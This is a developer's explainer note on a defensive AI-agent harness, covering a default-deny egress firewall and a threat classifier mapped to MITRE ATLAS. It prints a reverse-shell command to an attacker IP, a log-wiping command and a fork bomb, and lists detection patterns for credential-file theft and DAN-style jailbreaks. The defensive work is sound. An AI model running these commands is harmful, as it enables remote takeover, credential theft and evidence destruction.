# 📘 Explainer Note 04: Zero-Trust Egress Firewall & Threat Classification

> **Note:** This file is strictly for your personal learning. Because it is in `.gitignore`, Git will never push this file to GitHub.

---

## 🎯 What did we build in this commit?

In this commit, we built two crucial defense shields:
1. **`aegis/core/egress_firewall.py` (Zero-Trust Egress Firewall)**:
   - Enforces an absolute **Default-Deny** network policy.
   - Any attempt by the AI or an injected script to talk to the internet or an external IP is immediately dropped and recorded.
2. **`aegis/core/threat_detector.py` (Real-Time Threat Classifier)**:
   - Acts like an AI safety antivirus / eBPF kernel watcher.
   - Automatically detects 6 distinct categories of real-world hacker attacks:
     1. Password & Credential Theft (`/etc/passwd`, `/etc/shadow`, SSH keys).
     2. Reverse Shell Backdoors (`nc -e`, `bash -i`, connecting to C2 hacker servers).
     3. Anti-Forensic Log Wiping (`rm -rf /var/log`, `history -c`).
     4. Model Weight Tampering (`safetensors`, `weights`).
     5. Denial of Service / Fork Bombs (`:(){ :|:& };:`).
     6. Syntactic Prompt Jailbreaks (DAN mode, rule override prompts).
   - Maps every detected threat to official **MITRE ATLAS** cybersecurity standards (e.g. `AML.T0043`, `AML.T0015`).

---

## 🔬 How does this protect against Real-World Hackers? (In Plain English)

### 1. The Reverse Shell Trap:
- **What an attacker tries to do:** An attacker types a prompt that tricks an AI agent into running:
  ```bash
  nc -e /bin/sh 198.51.100.23 4444
  ```
  This command tries to make a phone call out to the hacker's computer (`198.51.100.23`) and hand them a live terminal so they can control the server remotely.
- **How AegisHarness stops it:**
  - Before the network packet can leave the machine, the **Zero-Trust Egress Firewall** catches it.
  - Because outbound traffic is 100% blocked by default, the connection is instantly severed.
  - The hacker is left waiting in the dark with no response.

### 2. The Log Wiper Trap:
- **What an attacker tries to do:** Once an attacker realizes they are caught, they try to destroy the evidence:
  ```bash
  history -c && rm -rf /var/log/*
  ```
- **How AegisHarness stops it:**
  - The **Threat Detector** immediately flags this as `AML.T0006 (Anti-Forensic Log Wiper Attack)`.
  - The Blue Zone logs are **not inside `/var/log`**; they are in an isolated, tamper-proof cryptographic ledger on an independent pipe!
  - The attacker wipes nothing, and the attempt itself triggers an instant **Quarantine Kill Switch**.

---

## ⏭️ What is coming in Commit 05?
In the next commit, we will build:
- **`aegis/attacks/library.py`**: The **Red-Team Adversarial Jailbreak Battery** (a ready-to-fire collection of multi-turn jailbreaks, prompt injections, and system exploits).
- **`aegis/attacks/runner.py`**: The **Automated Red-Team Execution Harness** that fires these exploits in automated batches or live tests!
